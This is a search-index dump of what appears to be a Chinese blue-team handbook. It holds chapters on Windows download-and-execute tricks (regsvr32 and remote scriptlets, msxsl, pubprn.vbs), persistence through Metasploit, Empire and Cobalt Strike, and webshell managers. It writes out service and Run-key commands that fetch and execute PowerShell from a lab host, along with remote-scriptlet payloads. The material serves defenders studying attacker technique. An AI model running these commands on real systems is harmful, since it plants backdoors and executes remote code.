Regsvr32\u547d\u4ee4\u7528\u4e8e\u6ce8\u518cCOM\u7ec4\u4ef6\uff0c\u662fWindows\u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6765\u5411\u7cfb\u7edf\u6ce8\u518c\u63a7\u4ef6\u6216\u8005\u5378\u8f7d\u63a7\u4ef6\u7684\u547d\u4ee4\uff0c\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u8fd0\u884c \u5728\u76ee\u6807\u673a\u4e0a\u6267\u884c\uff1a regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll \u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u6784\u9020.sct\u6587\u4ef6\uff0c\u53bb\u4e0b\u8f7d\u6267\u884c\u6211\u4eec\u7684\u7a0b\u5e8f <?XML version=\"1.0\"?> <scriptlet> <registration progid=\"ShortJSRAT\" classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" > <script language=\"JScript\"> <![CDATA[ ps = \"cmd.exe /c calc.exe\"; new ActiveXObject(\"WScript.Shell\").Run(ps,0,true); ]]> </script> </registration> </scriptlet> \u6267\u884c\u547d\u4ee4\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668\uff1a 14\u3001MSXSL.EXE msxsl.exe\u662f\u5fae\u8f6f\u7528\u4e8e\u547d\u4ee4\u884c\u4e0b\u5904\u7406XSL\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u901a\u8fc7\u4ed6\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884cJavaScript\u8fdb\u800c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=21714 msxsl.exe \u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u6587\u4ef6\uff0cXML\u53caXSL\u6587\u4ef6\uff0c\u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl demo.xml <?xml version=\"1.0\"?> <?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?> <customers> <customer> <name>Microsoft</name> </customer> </customers> exec.xsl <?xml version='1.0'?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\"> <msxsl:script language=\"JScript\" implements-prefix=\"user\"> function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\"); return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match=\"/\"> <xsl:value-of select=\"user:xml(.)\"/> </xsl:template> </xsl:stylesheet> 15\u3001pubprn.vbs \u5728Windows 7\u4ee5\u4e0a\u7248\u672c\u5b58\u5728\u4e00\u4e2a\u540d\u4e3aPubPrn.vbs\u7684\u5fae\u8f6f\u5df2\u7b7e\u540dWSH\u811a\u672c\uff0c\u5176\u4f4d\u4e8eC:\\Windows\\System32\\Printing_Admin_Scripts\\en-US\uff0c\u4ed4\u7ec6\u89c2\u5bdf\u8be5\u811a\u672c\u53ef\u4ee5\u53d1\u73b0\u5176\u663e\u7136\u662f\u7531\u7528\u6237\u63d0\u4f9b\u8f93\u5165\uff08\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\uff09\uff0c\u4e4b\u540e\u518d\u5c06\u53c2\u6570\u4f20\u9012\u7ed9GetObject() \"C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs\" 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct test.sct <?XML version=\"1.0\"?> <scriptlet> <registration description=\"Bandit\" progid=\"Bandit\" version=\"1.00\" classid=\"{AAAA1111-0000-0000-0000-0000FEEDACDC}\" remotable=\"true\" > </registration> <script language=\"JScript\"> <![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"calc.exe\"); ]]> </script> </scriptlet> \u53c2\u8003\u6587\u7ae0\uff1a https://xz.aliyun.com/t/1654/ https://evi1cg.me/archives/remote_exec.html \u6536\u96c6\u6574\u7406\u768415\u79cd\u6587\u4ef6\u4e0b\u8f7d\u7684\u65b9\u5f0f https://mp.weixin.qq.com/s/DfdUL5jFzJ8PvylxS6mN-A Windows\u6267\u884c\u547d\u4ee4\u4e0e\u4e0b\u8f7d\u6587\u4ef6\u603b\u7ed3 https://www.cnblogs.com/17bdw/p/8550189.html \u5728windows\u4e0a\u6267\u884c\u6076\u610f\u4ee3\u7801 by rundll32 & regsvr32 https://www.jianshu.com/p/e8f65deac245 IEexec.exe\u6267\u884cpayload https://www.codercto.com/a/104908.html rundll32.exe \u591a\u79cd\u65b9\u6cd5\u7ed5\u8fc7\u767d\u540d\u5355 https://www.cnblogs.com/backlion/p/10488747.html","title":"\u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#6","text":"","title":"\u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x00_2","text":"\u5728\u6e17\u900f\u6d4b\u8bd5\u4e2d\uff0c\u6709\u4e09\u4e2a\u975e\u5e38\u7ecf\u5178\u7684\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6----Metasploit\u3001Empire\u3001Cobalt Strike\u3002 \u90a3\u4e48\uff0c\u901a\u8fc7\u6f0f\u6d1e\u83b7\u53d6\u5230\u76ee\u6807\u4e3b\u673a\u6743\u9650\u540e\uff0c\u5982\u4f55\u5229\u7528\u6846\u67b6\u83b7\u5f97\u6301\u4e45\u6027\u6743\u9650\u5462\uff1f","title":"0x00 \u524d\u8a00"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x01-msf","text":"\u4f7f\u7528MSF\u7ef4\u6301\u6743\u9650\u7684\u524d\u63d0\u662f\u5148\u83b7\u5f97\u4e00\u4e2a*meterpreter* shell\uff0c\u901a\u8fc7*meterpreter* shell\u83b7\u53d6\u6301\u4e45\u6027shell\u7684\u65b9\u6cd5\u6709\u4e24\u79cd\uff1a Persistence\u6a21\u5757 \u901a\u8fc7\u542f\u52a8\u9879\u542f\u52a8(persistence)\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u4e0a\u4ee5\u53cd\u5f39\u56de\u8fde\u3002 -U\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7528\u6237\u767b\u5f55\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u63a8\u8350\u4f7f\u7528\u8be5\u53c2\u6570\uff1b -X\uff1a\u8bbe\u7f6e\u540e\u95e8\u5728\u7cfb\u7edf\u542f\u52a8\u540e\u81ea\u542f\u52a8\u3002\u8be5\u65b9\u5f0f\u4f1a\u5728HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\u4e0b\u6dfb\u52a0\u6ce8\u518c\u8868\u4fe1\u606f\u3002\u7531\u4e8e\u6743\u9650\u95ee\u9898\uff0c\u4f1a\u5bfc\u81f4\u6dfb\u52a0\u5931\u8d25\uff0c\u540e\u95e8\u5c06\u65e0\u6cd5\u542f\u52a8\u3002 -S\uff1a\u4f5c\u4e3a\u670d\u52a1\u81ea\u52a8\u542f\u52a8\u4ee3\u7406\u7a0b\u5e8f\uff08\u5177\u6709SYSTEM\u6743\u9650\uff09 \u751f\u6210\u7684\u76f8\u5173\u6587\u4ef6\u4f4d\u7f6e \uff1a # \u540e\u95e8\u6587\u4ef6\u4f4d\u7f6e\uff1a C:\\Windows\\Temp C:\\Users\\Administrator\\AppData\\Local\\Temp # \u6ce8\u518c\u8868\u4f4d\u7f6e\uff1a HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ Metsvc \u6a21\u5757 \u901a\u8fc7\u670d\u52a1(metsvc)\u542f\u52a8\u7684\u65b9\u5f0f\uff0c\u5728\u76ee\u6807\u673a\u5668\u542f\u52a8\u540e\u81ea\u542f\u52a8\u4e00\u4e2a\u670d\u52a1\uff0c\u7b49\u5f85\u8fde\u63a5\u3002 \u540e\u95e8\u6392\u67e5\uff1a\u76ee\u6807\u4e3b\u673a\u4e0a\u5f00\u542f\u4e86\u4e00\u4e2aMeterpreter\u670d\u52a1\u3002","title":"0x01 MSF\u6743\u9650\u7ef4\u6301"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x02-empire","text":"Empire\u7684persistence\u6a21\u5757\u63d0\u4f9b\u4e8618\u79cd\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5\uff0c\u5927\u81f4\u53ef\u4ee5\u5206\u4e3a\u56db\u7c7b\uff0c\u5373 elevated\uff08\u7ba1\u7406\u6743\u9650\uff09 misc\uff08\u6742\u9879\uff09 powerbreach userland\uff08\u7528\u6237\u6743\u9650\uff09 registry* add_netuser deaduser backdoor_lnk schtasks* add_sid_history* eventlog* registry wmi* debugger* resolver schtasks wmi_updater* disable_machine_acct_change* get_ssps install_ssp* memssp* skeleton_key* \u6ce8\u518c\u8868 (Empire: agents) > agents (Empire: agents) > interact URL3FZBV (Empire: URL3FZBV) > usemodule persistence/elevated/registry* (Empire: powershell/persistence/elevated/registry) > set Listener test (Empire: powershell/persistence/elevated/registry) > execute \u56e0\u4e3a\u662f\u5f00\u673a\u542f\u52a8\uff0c\u6240\u4ee5\u4f1a\u5f39\u4e2a\u9ed1\u6846\uff0c\u4e4b\u540e\u8fd8\u4f1a\u5f39\u51fa\u6ce8\u518c\u8868\u6dfb\u52a0\u7684powershell\u542f\u52a8\u9879\u7684\u6846\uff0c\u5728\u6ce8\u518c\u8868\u4f4d\u7f6e\u5982\u4e0b\uff1a \u8ba1\u5212\u4efb\u52a1 (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/schtasks* (Empire: powershell/persistence/elevated/schtasks) > set Listener test (Empire: powershell/persistence/elevated/schtasks) > set DailyTime 22:50 (Empire: powershell/persistence/elevated/schtasks) > execute \u5728\u4efb\u52a1\u8ba1\u5212\u7a0b\u5e8f\u5e93\u53ef\u4ee5\u770b\u5230-\u4efb\u52a1\u4e3aUpdater-\u542f\u52a8\u7a0b\u5e8f\u5982\u4e0b\u53ef\u4ee5\u5230\u4e3apowershell wmi (Empire: agents) > interact 9NZ2RWBC (Empire: 9NZ2RWBC) > usemodule persistence/elevated/wmi (Empire: powershell/persistence/elevated/wmi) > set Listener test (Empire: powershell/persistence/elevated/wmi) > run \u5982\u4f55\u6e05\u9664\u540e\u95e8\uff0c\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4f7f\u7528Autoruns\uff0c\u9009\u62e9WMI\u9009\u9879\u5361\uff0c\u53f3\u952e\u5c31\u53ef\u4ee5\u5220\u9664\u6076\u610f\u540e\u95e8\u3002","title":"0x02 Empire \u6743\u9650\u7ef4\u6301"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x03-cobalt-strike","text":"\u901a\u8fc7Cobalt Strike\u62ff\u5230\u4e00\u4e2ashell\uff0c\u7559\u540e\u95e8\u7684\u65b9\u6cd5\u6709\u5f88\u591a\uff0c\u4e0b\u9762\u4ecb\u7ecd\u4e24\u79cd\u6bd4\u8f83\u5e38\u89c1\u7684\u65e0\u6587\u4ef6\u3001\u81ea\u542f\u52a8\u540e\u95e8\u3002 \u4eceCobalt Strike\u83dc\u5355\u680f\uff0cAttacks--Web Drive-by--Scaripted Web Delivery\uff0c\u751f\u6210powershell\u540e\u95e8\u3002 \u6839\u636e\u9700\u8981\u53ef\u4ee5\u81ea\u5df1\u9009\u62e9\uff0c\u586b\u5199\u6240\u9700\u53c2\u6570\u9ed8\u8ba4\u7aef\u53e3\u662f80\uff08\u9700\u8981\u6ce8\u610f\u7684\u5c31\u662f\u4e0d\u8981\u4f7f\u7528\u91cd\u590d\u7aef\u53e3\uff09\uff0cType\u9009\u62e9powershell\u3002 \u70b9\u51fbLaunch\u540e\uff0c\u8fd4\u56depowershell\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\u547d\u4ee4\u3002 \u670d\u52a1\u81ea\u542f\u52a8\u540e\u95e8 sc create \"Name\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" sc description Name \"Just For Test\" //\u8bbe\u7f6e\u670d\u52a1\u7684\u63cf\u8ff0\u5b57\u7b26\u4e32 sc config Name start= auto //\u8bbe\u7f6e\u8fd9\u4e2a\u670d\u52a1\u4e3a\u81ea\u52a8\u542f\u52a8 net start Name //\u542f\u52a8\u670d\u52a1 \u91cd\u542f\u670d\u52a1\u5668\u540e\uff0c\u6210\u529f\u8fd4\u56de\u4e00\u4e2ashell\u3002 \u6ce8\u518c\u8868\u81ea\u542f\u52a8 \u5728windows\u542f\u52a8\u9879\u6ce8\u518c\u8868\u91cc\u9762\u6dfb\u52a0\u4e00\u4e2a\u6728\u9a6c\u7a0b\u5e8f\u8def\u5f84\uff0c\u5982\uff1a beacon>getsystem beacon>shell reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Keyname\" /t REG_SZ /d \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8080/a'))\\\"\" /f \u8d26\u53f7\u6ce8\u9500\u540e\uff0c\u91cd\u65b0\u767b\u5f55\uff0c\u754c\u9762\u4e0a\u4f1a\u51fa\u73b0powershell\u5feb\u901f\u95ea\u8fc7\u6d88\u5931\uff0c\u6210\u529f\u8fd4\u56deshell\u3002 \u6ce8\u518c\u8868\u8fd8\u6709\u54ea\u4e9b\u952e\u503c\u53ef\u4ee5\u8bbe\u7f6e\u4e3a\u81ea\u542f\u52a8\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","title":"0x03 Cobalt Strike\u6743\u9650\u7ef4\u6301"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#0x04_2","text":"\u672c\u6587\u7b80\u5355\u4ecb\u7ecd\u4e86\u901a\u8fc7\u4e09\u5927\u6e17\u900f\u6846\u67b6\u8fdb\u884c\u6743\u9650\u7ef4\u6301\u7684\u51e0\u79cd\u65b9\u6cd5\uff0c\u4e86\u89e3\u653b\u51fb\u8005\u5e38\u7528\u7684\u6e17\u900f\u6846\u67b6\u53ca\u540e\u95e8\u6280\u672f\uff0c\u6709\u52a9\u4e8e\u66f4\u597d\u5730\u53bb\u53d1\u73b0\u5e76\u89e3\u51b3\u670d\u52a1\u5668\u5b89\u5168\u95ee\u9898\u3002","title":"0x04 \u7ed3\u675f\u8bed"},{"location":"blueteam/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#7webshell","text":"\u653b\u51fb\u8005\u5728\u5165\u4fb5\u7f51\u7ad9\u65f6\uff0c\u901a\u5e38\u8981\u901a\u8fc7\u5404\u79cd\u65b9\u5f0f\u5199\u5165Webshell\uff0c\u4ece\u800c\u83b7\u5f97\u670d\u52a1\u5668\u7684\u63a7\u5236\u6743\u9650\uff0c\u6bd4\u5982\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3001\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\u3001\u7a83\u53d6\u7528\u6237\u6570\u636e\uff0c\u7be1\u6539\u7f51\u7ad9\u9875\u9762\u7b49\u64cd\u4f5c\u3002 \u672c\u6587\u4ecb\u7ecd\u5341\u6b3e\u5e38\u7528\u7684Webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ee5\u4f9b\u4f60\u9009\u62e9\uff0c\u4f60\u4f1a\u9009\u62e9\u54ea\u4e00\u4e2a\uff1f 1\u3001\u4e2d\u56fd\u83dc\u5200(Chopper) \u4e2d\u56fd\u83dc\u5200\u662f\u4e00\u6b3e\u4e13\u4e1a\u7684\u7f51\u7ad9\u7ba1\u7406\u8f6f\u4ef6\uff0c\u7528\u9014\u5e7f\u6cdb\uff0c\u4f7f\u7528\u65b9\u4fbf\uff0c\u5c0f\u5de7\u5b9e\u7528\u3002\u53ea\u8981\u652f\u6301\u52a8\u6001\u811a\u672c\u7684\u7f51\u7ad9\uff0c\u90fd\u53ef\u4ee5\u7528\u4e2d\u56fd\u83dc\u5200\u6765\u8fdb\u884c\u7ba1\u7406\uff01\u5728\u975e\u7b80\u4f53\u4e2d\u6587\u73af\u5883\u4e0b\u4f7f\u7528\uff0c\u81ea\u52a8\u5207\u6362\u5230\u82f1\u6587\u754c\u9762\u3002UNICODE\u65b9\u5f0f\u7f16\u8bd1\uff0c\u652f\u6301\u591a\u56fd\u8bed\u8a00\u8f93\u5165\u663e\u793a\u3002 2\u3001\u8681\u5251(AntSword) AntSword\u662f\u4e00\u4e2a\u5f00\u653e\u6e90\u4ee3\u7801\uff0c\u8de8\u5e73\u53f0\u7684\u7f51\u7ad9\u7ba1\u7406\u5de5\u5177\uff0c\u65e8\u5728\u6ee1\u8db3\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u4ee5\u53ca\u5177\u6709\u6743\u9650\u548c/\u6216\u6388\u6743\u7684\u5b89\u5168\u7814\u7a76\u4eba\u5458\u4ee5\u53ca\u7f51\u7ad9\u7ba1\u7406\u5458\u7684\u9700\u6c42\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/AntSwordProject/antSword 3\u3001C\u5200(Cknife) \u8fd9\u662f\u4e00\u6b3e\u8de8\u5e73\u53f0\u7684\u57fa\u4e8e\u914d\u7f6e\u6587\u4ef6\u7684\u4e2d\u56fd\u83dc\u5200\uff0c\u628a\u6240\u6709\u64cd\u4f5c\u7ed9\u4e88\u7528\u6237\u6765\u5b9a\u4e49\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/Chora10/Cknife 4\u3001\u51b0\u874e(Behinder) \u51b0\u874e\u201d\u662f\u4e00\u6b3e\u52a8\u6001\u4e8c\u8fdb\u5236\u52a0\u5bc6\u7f51\u7ad9\u7ba1\u7406\u5ba2\u6237\u7aef\u3002 github\u5730\u5740\uff1a https://github.com/rebeyond/Behinder 5\u3001Xise XISE WebShell\u7ba1\u7406\u5de5\u5177\u3002 6\u3001Altman Altman3\u662f\u4e00\u6b3e\u6e17\u900f\u6d4b\u8bd5\u8f6f\u4ef6\uff0c\u57fa\u4e8e.Net4.0\u5f00\u53d1\uff0c\u4f9d\u6258Eto.Form\u53ef\u4ee5\u5b8c\u7f8e\u8fd0\u884c\u5728Windows\u3001Linux\u3001Mac\u7b49\u591a\u4e2a\u5e73\u53f0\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/keepwn/Altman 7\u3001Weevely Weevely\u662f\u4e00\u79cdPython\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u8de8\u5e73\u53f0\uff0c\u53ea\u652f\u6301PHP\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/epinna/weevely3 \u7528\u6cd5\u793a\u4f8b\uff1a weevely generate <password> <path> weevely <URL> <password> [cmd] \u540c\u65f6\uff0c\u5728Kali 2.0 \u7248\u672c\u4e0b\uff0c\u96c6\u6210\u4e86\u4e09\u6b3eWeb\u540e\u95e8\u5de5\u5177\uff1aWebaCoo\u3001weevely\u3001PHP Meterpreter\u3002 8\u3001QuasiBot QuasiBot\u662f\u4e00\u6b3ephp\u7f16\u5199\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u53ef\u4ee5\u5bf9webshell\u8fdb\u884c\u8fdc\u7a0b\u6279\u91cf\u7ba1\u7406\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/Smaash/quasibot 9\u3001Webshell-Sniper \u8fd9\u662f\u4e00\u6b3e\u57fa\u4e8e\u7ec8\u7aef\u7684webshell\u7ba1\u7406\u5de5\u5177\uff0c\u4ec5\u652f\u6301\u5728\u7c7bUnix\u7cfb\u7edf\u4e0a\u8fd0\u884c\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/WangYihang/Webshell-Sniper \u7528\u6cd5\u793a\u4f8b\uff1a Usage : python webshell-sniper.py [URL] [METHOD] [AUTH] Example : python webshell-sniper.py http://127.0.0.1/c.php POST c 10\u3001WebshellManager \u4e00\u6b3e\u7528PHP+Mysql\u5199\u7684\u4e00\u53e5\u8bddWEB\u7aef\u7ba1\u7406\u5de5\u5177\uff0c\u76ee\u524d\u4ec5\u652f\u6301\u5bf9PHP\u7684\u4e00\u53e5\u8bdd\u8fdb\u884c\u64cd\u4f5c\u3002 github\u9879\u76ee\u5730\u5740\uff1a https://github.com/boy-hack/WebshellManager","title":"\u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E6%89%8B%E5%86%8C/","text":"","title":"\u84dd\u961f\u624b\u518c"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/","text":"\u9879\u76ee\u76ee\u5f55 \u00b6 \u53c2\u8003bypass007\uff0c\u5e94\u6025\u54cd\u5e94\u7b14\u8bb0 [\u7b2c\u4e00\u7ae0\uff1a\u5165\u4fb5\u6392\u67e5\u7bc7] \u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5 \u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5 \u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177 \u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8 \u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 [\u7b2c\u4e8c\u7ae0\uff1a\u65e5\u5fd7\u5206\u6790\u7bc7] \u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790 \u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 [\u7b2c\u4e09\u7ae0\uff1a\u6743\u9650\u7ef4\u6301\u7bc7] \u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b \u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f \u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177 [\u7b2c\u56db\u7ae0:Windows\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 [\u7b2c\u4e94\u7ae0\uff1aLinux\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 \u7b2c6\u7bc7\uff1aShell\u75c5\u6bd2 [\u7b2c\u516d\u7ae0\uff1aWeb\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1a\u7f51\u7ad9\u88ab\u690d\u5165Webshell \u7b2c2\u7bc7\uff1a\u95e8\u7f57\u5e01\u6076\u610f\u6316\u77ff \u7b2c3\u7bc7\uff1a\u6279\u91cf\u6302\u9ed1\u9875 \u7b2c4\u7bc7\uff1a\u65b0\u95fb\u6e90\u7f51\u7ad9\u52ab\u6301 \u7b2c5\u7bc7\uff1a\u79fb\u52a8\u7aef\u52ab\u6301 \u7b2c6\u7bc7\uff1a\u641c\u7d22\u5f15\u64ce\u52ab\u6301 \u7b2c7\u7bc7\uff1a\u7f51\u7ad9\u9996\u9875\u88ab\u7be1\u6539 \u7b2c8\u7bc7\uff1a\u7ba1\u7406\u5458\u8d26\u53f7\u88ab\u7be1\u6539 \u7b2c9\u7bc7\uff1a\u7f16\u8f91\u5668\u5165\u4fb5\u4e8b\u4ef6","title":"\u76ee\u5f55"},{"location":"blueteam/%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/#_1","text":"\u53c2\u8003bypass007\uff0c\u5e94\u6025\u54cd\u5e94\u7b14\u8bb0 [\u7b2c\u4e00\u7ae0\uff1a\u5165\u4fb5\u6392\u67e5\u7bc7] \u7b2c1\u7bc7\uff1aWindow\u5165\u4fb5\u6392\u67e5 \u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5 \u7b2c3\u7bc7\uff1a\u5e38\u89c1\u7684Webshell\u67e5\u6740\u5de5\u5177 \u7b2c4\u7bc7\uff1a\u5982\u4f55\u53d1\u73b0\u9690\u85cf\u7684Webshell\u540e\u95e8 \u7b2c5\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2\u81ea\u6551\u6307\u5357 [\u7b2c\u4e8c\u7ae0\uff1a\u65e5\u5fd7\u5206\u6790\u7bc7] \u7b2c1\u7bc7:Window\u65e5\u5fd7\u5206\u6790 \u7b2c2\u7bc7:Linux\u65e5\u5fd7\u5206\u6790 \u7b2c3\u7bc7:Web\u65e5\u5fd7\u5206\u6790 \u7b2c4\u7bc7:MSSQL\u65e5\u5fd7\u5206\u6790 \u7b2c5\u7bc7:MySQL\u65e5\u5fd7\u5206\u6790 [\u7b2c\u4e09\u7ae0\uff1a\u6743\u9650\u7ef4\u6301\u7bc7] \u7b2c1\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c2\u7bc7\uff1aWindows\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c3\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u9690\u85cf\u7bc7 \u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7 \u7b2c5\u7bc7\uff1aWindows\u547d\u4ee4\u884c\u6587\u4ef6\u4e0b\u8f7d\u65b9\u5f0f\u6c47\u603b \u7b2c6\u7bc7\uff1a\u4e09\u5927\u6e17\u900f\u6d4b\u8bd5\u6846\u67b6\u6743\u9650\u7ef4\u6301\u6280\u672f \u7b2c7\u7bc7\uff1a\u5e38\u89c1WebShell\u7ba1\u7406\u5de5\u5177 [\u7b2c\u56db\u7ae0:Windows\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aFTP\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u8815\u866b\u75c5\u6bd2 \u7b2c3\u7bc7\uff1a\u52d2\u7d22\u75c5\u6bd2 \u7b2c4\u7bc7\uff1aARP\u75c5\u6bd2 \u7b2c5\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e00\uff09 \u7b2c6\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2\uff08\u4e8c\uff09 [\u7b2c\u4e94\u7ae0\uff1aLinux\u5b9e\u6218\u7bc7] \u7b2c1\u7bc7\uff1aSSH\u66b4\u529b\u7834\u89e3 \u7b2c2\u7bc7\uff1a\u6355\u6349\u77ed\u8fde\u63a5 \u7b2c3\u7bc7\uff1a\u6316\u77ff\u75c5\u6bd2 \u7b2c4\u7bc7\uff1a\u76d6\u8328\u6728\u9a6c \u7b2c5\u7bc7\uff1aDDOS\u75c5\u6bd2 